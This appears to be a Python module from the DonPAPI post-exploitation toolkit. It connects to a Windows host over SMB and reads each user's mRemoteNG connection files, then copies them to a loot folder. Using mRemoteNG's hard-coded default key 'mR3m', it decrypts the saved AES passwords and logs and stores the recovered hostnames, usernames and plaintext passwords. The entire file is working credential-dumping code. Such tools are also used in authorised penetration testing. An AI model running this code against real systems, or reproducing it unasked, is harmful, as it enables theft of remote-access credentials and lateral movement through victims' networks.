import ntpath
import hashlib
import os
from typing import Any
from lxml import objectify
from base64 import b64decode
from Cryptodome.Cipher import AES
from dataclasses import dataclass
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter
from donpapi.lib.utils import dump_file_to_loot_directories


@dataclass
class MRemoteNgEncryptionAttributes:
    kdf_iterations: int
    block_cipher_mode: str
    encryption_engine: str
    full_file_encryption: bool

class MRemoteNG:
    default_password = "mR3m"
    user_directories = [
        ("Users\\{username}\\AppData\\Local\\mRemoteNG", 
        ('mRemoteNG.settings','confCons.xml')),
        ("Users\\{username}\\AppData\\Roaming\\mRemoteNG", 
        ('mRemoteNG.settings','confCons.xml'))
    ]

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping MRemoteNg Passwords")
        for user in self.context.users:
            for path, files in self.user_directories:
                user_path = path.format(username=user)
                for file in files:
                    tmp_confcons_path = ntpath.join(user_path,file)
                    content = self.conn.readFile(self.context.share, tmp_confcons_path)
                    if content is None:
                        continue
                    dump_file_to_loot_directories(os.path.join(self.context.target_output_dir, *(tmp_confcons_path.split('\\'))), content)
                    main = objectify.fromstring(content)
                    try:
                        encryption_attributes = MRemoteNgEncryptionAttributes(
                            kdf_iterations = int(main.attrib["KdfIterations"]),
                            block_cipher_mode = main.attrib["BlockCipherMode"],
                            encryption_engine = main.attrib["EncryptionEngine"],
                            full_file_encryption = bool(main.attrib["FullFileEncryption"]),
                        )
                        
                        for node_attribute in self.parse_xml_nodes(main):
                            password = self.extract_remoteng_passwords(node_attribute["Password"], encryption_attributes)
                            if password == b"":
                                continue
                            name = node_attribute["Name"]
                            hostname = node_attribute["Hostname"]
                            domain = node_attribute["Domain"] if node_attribute["Domain"] != "" else node_attribute["Hostname"]
                            username = node_attribute["Username"]
                            protocol = node_attribute["Protocol"]
                            port = node_attribute["Port"]
                            host = f" {protocol}://{hostname}:{port}" if node_attribute["Hostname"] != "" else "" 
                            self.logger.secret(f"[{user}] {name}:{host} - {domain}\\{username}:{password}", self.tag)
                            self.context.db.add_secret(computer=self.context.host, collector=self.tag, program=self.tag, windows_user=user, target=host, username=f"{domain}\\{username}", password=password)
                    except KeyError:
                        continue
                    except Exception as e:
                        self.logger.verbose(f"Error while extracting mRemoteNg passwords in {tmp_confcons_path}: {e}")
                        continue
                    
    def parse_xml_nodes(self, main):
        nodes = []
        for node in list(main.getchildren()):
            node_attributes = node.attrib
            if node_attributes["Type"] == "Connection":
                nodes.append(node.attrib)
            elif node_attributes["Type"] == "Container":
                nodes.append(node.attrib)
                nodes = nodes + self.parse_xml_nodes(node)
        return nodes
    
    def extract_remoteng_passwords(self, encrypted_password, encryption_attributes: MRemoteNgEncryptionAttributes):
        encrypted_password = b64decode(encrypted_password)
        if encrypted_password == b'':
            return encrypted_password

        if encryption_attributes.encryption_engine == "AES":
            salt = encrypted_password[:16]
            associated_data = encrypted_password[:16]
            nonce = encrypted_password[16:32]
            ciphertext = encrypted_password[32:-16]
            tag = encrypted_password[-16:]
            key = hashlib.pbkdf2_hmac("sha1", self.default_password.encode(), salt, encryption_attributes.kdf_iterations, dklen=32)
            if encryption_attributes.block_cipher_mode == "GCM":
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            elif encryption_attributes.block_cipher_mode == 'CCM':
                cipher = AES.new(key, AES.MODE_CCM, nonce=nonce)
            elif encryption_attributes.block_cipher_mode == 'EAX':
                cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            else:
                self.logger.fail(f"Could not decrypt MRemoteNG password with encryption algorithm {encryption_attributes.encryption_engine}-{encryption_attributes.block_cipher_mode}: Not yet implemented")
            cipher.update(associated_data)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf8')
        else:
            self.logger.fail(f"Could not decrypt MRemoteNG password with encryption algorithm {encryption_attributes.encryption_engine}: Not yet implemented")